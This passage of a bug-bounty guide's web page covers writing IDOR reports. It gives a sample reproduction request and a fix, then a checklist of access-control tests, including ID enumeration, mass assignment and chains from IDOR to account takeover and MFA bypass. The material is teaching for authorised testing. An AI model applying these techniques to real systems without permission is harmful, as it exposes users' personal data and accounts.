+<h3 id="352-writing-the-idor-report">3.5.2 Writing the IDOR Report<a class="headerlink" href="#352-writing-the-idor-report" title="Permanent link">&para;</a></h3>
+<p>The difference between a paid IDOR report and a rejected one is almost always the impact statement and reproduction steps.</p>
+<p><strong>Title formula:</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>IDOR in [feature/endpoint] allows [actor] to [impact] via [parameter]
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>Examples:
+</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>&quot;IDOR in /api/invoices/{id} allows any authenticated user to read
+</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a> other users&#39; invoices via numeric ID manipulation&quot;
+</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>
+</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a>&quot;IDOR in document export endpoint allows account takeover via
+</span><span id="__span-15-8"><a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a> predictable document_id parameter&quot;
+</span></code></pre></div>
+<p><strong>Write the impact statement first:</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>An authenticated attacker with a free account can enumerate all user invoices
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>by incrementing the invoice_id parameter. Each invoice contains full billing
+</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>information including name, address, and last 4 digits of payment card.
+</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a>With approximately 50,000 users, this exposes PII for the entire user base.
+</span></code></pre></div>
+<p><strong>Reproduction steps — write for a developer with no security knowledge:</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>1. Create two accounts: Account A (attacker) and Account B (victim)
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>2. Log in as Account B, create an invoice. Note the ID in the URL: /invoice/5523
+</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>3. Log in as Account A
+</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a>4. Send the following request:
+</span><span id="__span-17-5"><a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a>
+</span><span id="__span-17-6"><a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a>   GET /api/invoice/5523 HTTP/1.1
+</span><span id="__span-17-7"><a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a>   Host: target.com
+</span><span id="__span-17-8"><a id="__codelineno-17-8" name="__codelineno-17-8" href="#__codelineno-17-8"></a>   Cookie: session=&lt;Account_A_session&gt;
+</span><span id="__span-17-9"><a id="__codelineno-17-9" name="__codelineno-17-9" href="#__codelineno-17-9"></a>
+</span><span id="__span-17-10"><a id="__codelineno-17-10" name="__codelineno-17-10" href="#__codelineno-17-10"></a>5. Observe: the full invoice is returned, including Account B&#39;s billing
+</span><span id="__span-17-11"><a id="__codelineno-17-11" name="__codelineno-17-11" href="#__codelineno-17-11"></a>   information, despite Account A having no relationship to Account B.
+</span></code></pre></div>
+<p><strong>Evidence:</strong></p>
+<ul>
+<li>Raw HTTP request and response (victim's data highlighted or annotated)</li>
+<li>Screenshot or screen recording — video dramatically increases acceptance rate</li>
+<li>For mass IDOR: show a range of IDs returning different users' data</li>
+</ul>
+<p><strong>Suggested fix:</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>Implement server-side ownership verification before returning any object.
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>Verify that the requesting user&#39;s ID matches the owner_id field of the
+</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>requested resource. Do not rely on ID obscurity.
+</span></code></pre></div>
+<div class="admonition tip">
+<p class="admonition-title">See also</p>
+<p>Part 11 (Reporting Mastery) covers full report templates and severity calibration in depth.</p>
+</div>
+<hr />
+<h2 id="part-3-complete-checklist">Part 3 Complete Checklist<a class="headerlink" href="#part-3-complete-checklist" title="Permanent link">&para;</a></h2>
+<details class="note">
+<summary>Expand full checklist</summary>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>IDOR — HORIZONTAL (same privilege, different user)
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>□ Every numeric ID in URL paths — increment/decrement
+</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>□ Every ID in request body parameters
+</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a>□ Every ID in query string parameters
+</span><span id="__span-19-5"><a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a>□ Every ID in custom headers (X-User-ID, X-Account-ID)
+</span><span id="__span-19-6"><a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a>□ Cookie values containing IDs or references
+</span><span id="__span-19-7"><a id="__codelineno-19-7" name="__codelineno-19-7" href="#__codelineno-19-7"></a>□ UUIDs in responses — are they used in subsequent requests?
+</span><span id="__span-19-8"><a id="__codelineno-19-8" name="__codelineno-19-8" href="#__codelineno-19-8"></a>□ Hash-based IDs — predictable from known input?
+</span><span id="__span-19-9"><a id="__codelineno-19-9" name="__codelineno-19-9" href="#__codelineno-19-9"></a>□ Encoded values (base64, URL-encoded) — decode and analyze
+</span><span id="__span-19-10"><a id="__codelineno-19-10" name="__codelineno-19-10" href="#__codelineno-19-10"></a>□ Autorize running during full manual app walkthrough
+</span><span id="__span-19-11"><a id="__codelineno-19-11" name="__codelineno-19-11" href="#__codelineno-19-11"></a>□ Two-account methodology: Account B&#39;s IDs tested from Account A
+</span><span id="__span-19-12"><a id="__codelineno-19-12" name="__codelineno-19-12" href="#__codelineno-19-12"></a>
+</span><span id="__span-19-13"><a id="__codelineno-19-13" name="__codelineno-19-13" href="#__codelineno-19-13"></a>IDOR — WRITE OPERATIONS (higher impact)
+</span><span id="__span-19-14"><a id="__codelineno-19-14" name="__codelineno-19-14" href="#__codelineno-19-14"></a>□ PUT/PATCH/DELETE on object IDs — can you modify/delete others&#39; objects?
+</span><span id="__span-19-15"><a id="__codelineno-19-15" name="__codelineno-19-15" href="#__codelineno-19-15"></a>□ Action endpoints: /share, /transfer, /export, /delete with ID params
+</span><span id="__span-19-16"><a id="__codelineno-19-16" name="__codelineno-19-16" href="#__codelineno-19-16"></a>□ File operations: download?file=, template=, export?document=
+</span><span id="__span-19-17"><a id="__codelineno-19-17" name="__codelineno-19-17" href="#__codelineno-19-17"></a>
+</span><span id="__span-19-18"><a id="__codelineno-19-18" name="__codelineno-19-18" href="#__codelineno-19-18"></a>IDOR → ATO CHAINS
+</span><span id="__span-19-19"><a id="__codelineno-19-19" name="__codelineno-19-19" href="#__codelineno-19-19"></a>□ Read IDOR on email/phone → trigger password reset → ATO
+</span><span id="__span-19-20"><a id="__codelineno-19-20" name="__codelineno-19-20" href="#__codelineno-19-20"></a>□ Read IDOR on reset token → use token → ATO
+</span><span id="__span-19-21"><a id="__codelineno-19-21" name="__codelineno-19-21" href="#__codelineno-19-21"></a>□ Write IDOR on email field → change to attacker email → reset → ATO
+</span><span id="__span-19-22"><a id="__codelineno-19-22" name="__codelineno-19-22" href="#__codelineno-19-22"></a>□ Read IDOR on MFA codes → bypass MFA
+</span><span id="__span-19-23"><a id="__codelineno-19-23" name="__codelineno-19-23" href="#__codelineno-19-23"></a>
+</span><span id="__span-19-24"><a id="__codelineno-19-24" name="__codelineno-19-24" href="#__codelineno-19-24"></a>VERTICAL PRIVILEGE ESCALATION
+</span><span id="__span-19-25"><a id="__codelineno-19-25" name="__codelineno-19-25" href="#__codelineno-19-25"></a>□ Role/admin parameters in registration or profile update
+</span><span id="__span-19-26"><a id="__codelineno-19-26" name="__codelineno-19-26" href="#__codelineno-19-26"></a>□ Mass assignment: add role/admin/plan fields to any PUT/PATCH
+</span><span id="__span-19-27"><a id="__codelineno-19-27" name="__codelineno-19-27" href="#__codelineno-19-27"></a>□ Admin endpoints accessible with regular session (ffuf + auth cookie)
+</span><span id="__span-19-28"><a id="__codelineno-19-28" name="__codelineno-19-28" href="#__codelineno-19-28"></a>□ HTTP method swap on 403&#39;d admin endpoints
+</span><span id="__span-19-29"><a id="__codelineno-19-29" name="__codelineno-19-29" href="#__codelineno-19-29"></a>□ Multi-step flow: can steps be skipped? Step 2 reachable without step 1?
+</span><span id="__span-19-30"><a id="__codelineno-19-30" name="__codelineno-19-30" href="#__codelineno-19-30"></a>
+</span><span id="__span-19-31"><a id="__codelineno-19-31" name="__codelineno-19-31" href="#__codelineno-19-31"></a>INDIRECT REFERENCES
+</span><span id="__span-19-32"><a id="__codelineno-19-32" name="__codelineno-19-32" href="#__codelineno-19-32"></a>□ Email as object reference — change email param to victim&#39;s
+</span><span id="__span-19-33"><a id="__codelineno-19-33" name="__codelineno-19-33" href="#__codelineno-19-33"></a>□ Username as object reference
+</span><span id="__span-19-34"><a id="__codelineno-19-34" name="__codelineno-19-34" href="#__codelineno-19-34"></a>□ Filename as reference — path traversal variant
+</span><span id="__span-19-35"><a id="__codelineno-19-35" name="__codelineno-19-35" href="#__codelineno-19-35"></a>□ Slug/readable ID — predictable from naming pattern
+</span><span id="__span-19-36"><a id="__codelineno-19-36" name="__codelineno-19-36" href="#__codelineno-19-36"></a>
+</span><span id="__span-19-37"><a id="__codelineno-19-37" name="__codelineno-19-37" href="#__codelineno-19-37"></a>IMPACT ASSESSMENT
+</span><span id="__span-19-38"><a id="__codelineno-19-38" name="__codelineno-19-38" href="#__codelineno-19-38"></a>□ What is the worst action possible with this IDOR?
+</span><span id="__span-19-39"><a id="__codelineno-19-39" name="__codelineno-19-39" href="#__codelineno-19-39"></a>□ Is this mass-exploitable (sequential IDs, all users affected)?
+</span><span id="__span-19-40"><a id="__codelineno-19-40" name="__codelineno-19-40" href="#__codelineno-19-40"></a>□ Does it expose PII, credentials, payment data, or enable ATO?
+</span><span id="__span-19-41"><a id="__codelineno-19-41" name="__codelineno-19-41" href="#__codelineno-19-41"></a>□ Is the write version also vulnerable, not just read?
+</span></code></pre></div>
+</details>
+<hr />
+<h2 id="references">References<a class="headerlink" href="#references" title="Permanent link">&para;</a></h2>
+<div class="grid cards">
+<ul>
+<li>
+<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0v24h10.718v-3.805l3.496-4.272h-3.496v-5.205H4.427l6.291-7.767V0Zm13.282 0v3.884L9.786 8.155h3.496v5.205h6.291l-6.291 7.767V24H24V0Z"/></svg></span> <strong>PortSwigger Labs</strong></p>
+<hr />
+<ul>
+<li><a href="https://portswigger.net/web-security/access-control">Access control vulnerabilities</a></li>
+<li><a href="https://portswigger.net/web-security/access-control/idor">IDOR</a></li>
+</ul>
+</li>
+<li>
+<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16"><path d="M5.433 2.304A4.49 4.49 0 0 0 3.5 6c0 1.598.832 3.002 2.09 3.802.518.328.929.923.902 1.64v.008l-.164 3.337a.75.75 0 1 1-1.498-.073l.163-3.33c.002-.085-.05-.216-.207-.316A6 6 0 0 1 2 6a6 6 0 0 1 2.567-4.92 1.48 1.48 0 0 1 1.673-.04c.462.296.76.827.76 1.423v2.82c0 .082.041.16.11.206l.75.51a.25.25 0 0 0 .28 0l.75-.51A.25.25 0 0 0 9 5.282V2.463c0-.596.298-1.127.76-1.423a1.48 1.48 0 0 1 1.673.04A6 6 0 0 1 14 6a6 6 0 0 1-2.786 5.068c-.157.1-.209.23-.207.315l.163 3.33a.752.752 0 0 1-1.094.714.75.75 0 0 1-.404-.64l-.164-3.345c-.027-.717.384-1.312.902-1.64A4.5 4.5 0 0 0 12.5 6a4.49 4.49 0 0 0-1.933-3.696c-.024.017-.067.067-.067.16v2.818a1.75 1.75 0 0 1-.767 1.448l-.75.51a1.75 1.75 0 0 1-1.966 0l-.75-.51A1.75 1.75 0 0 1 5.5 5.282V2.463c0-.092-.043-.142-.067-.159"/></svg></span> <strong>Tools</strong></p>
+<hr />
+<ul>
+<li><a href="https://portswigger.net/bappstore/f9bbac8c4acf4aefa4d7dc92a991af2f">Autorize (BApp Store)</a></li>
+<li><a href="https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943">Param Miner (BApp Store)</a></li>
+</ul>
+</li>
+<li>
+<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16"><path d="M0 1.75A.75.75 0 0 1 .75 1h4.253c1.227 0 2.317.59 3 1.501A3.74 3.74 0 0 1 11.006 1h4.245a.75.75 0 0 1 .75.75v10.5a.75.75 0 0 1-.75.75h-4.507a2.25 2.25 0 0 0-1.591.659l-.622.621a.75.75 0 0 1-1.06 0l-.622-.621A2.25 2.25 0 0 0 5.258 13H.75a.75.75 0 0 1-.75-.75Zm7.251 10.324.004-5.073-.002-2.253A2.25 2.25 0 0 0 5.003 2.5H1.5v9h3.757a3.75 3.75 0 0 1 1.994.574M8.755 4.75l-.004 7.322a3.75 3.75 0 0 1 1.992-.572H14.5v-9h-3.495a2.25 2.25 0 0 0-2.25 2.25"/></svg></span> <strong>References</strong></p>
+<hr />
+<ul>
+<li><a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">OWASP — Broken Access Control</a></li>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Direct%20Object%20References">PayloadsAllTheThings — IDOR</a></li>
+<li><a href="https://book.hacktricks.xyz/pentesting-web/idor">HackTricks — IDOR</a></li>
+</ul>
+</li>
+</ul>
+</div>
+
+
+  <nav class="md-tags" >
+    
+      
+      
+      
+      
+        <span class="md-tag">idor</span>
+      
+    
+      
+      
+      
+      
+        <span class="md-tag">access-control</span>
+      
+    
+      
+      
+      
+      
+        <span class="md-tag">privilege-escalation</span>
+      
+    
+      
+      
+      
+      
+        <span class="md-tag">bug-bounty</span>
+      
+    
+  </nav>
+
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var labels=set.querySelector(".tabbed-labels");for(var tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>
+
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-circle-arrow-up" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="m16 12-4-4-4 4M12 16V8"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../part-02-authentication/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Authentication">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-arrow-left" viewBox="0 0 24 24"><path d="m12 19-7-7 7-7M19 12H5"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                Authentication
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../part-04-injection/" class="md-footer__link md-footer__link--next" aria-label="Next: Injection">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                Injection
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-arrow-right" viewBox="0 0 24 24"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Copyright &copy; 2026 Wellington Vumu
+
+    </div>
+  
+  
+    Made with
+    <a href="https://zensical.org/" target="_blank" rel="noopener">
+      Zensical
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate":null,"base":"..","features":["announce.dismiss","content.code.annotate","content.code.copy","content.code.select","content.footnote.tooltips","content.tabs.link","content.tooltips","navigation.footer","navigation.instant","navigation.instant.prefetch","navigation.path","navigation.sections","navigation.top","navigation.tracking","search.highlight"],"search":"../assets/javascripts/workers/search.e2d2d235.min.js","tags":null,"translations":{"clipboard.copied":"Copied to clipboard","clipboard.copy":"Copy to clipboard","search.result.more.one":"1 more on this page","search.result.more.other":"# more on this page","search.result.none":"No matching documents","search.result.one":"1 matching document","search.result.other":"# matching documents","search.result.placeholder":"Type to start searching","search.result.term.missing":"Missing","select.version":"Select version"},"version":null}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.dbc0afdc.min.js"></script>
+      
+    
+  </body>
+</html>
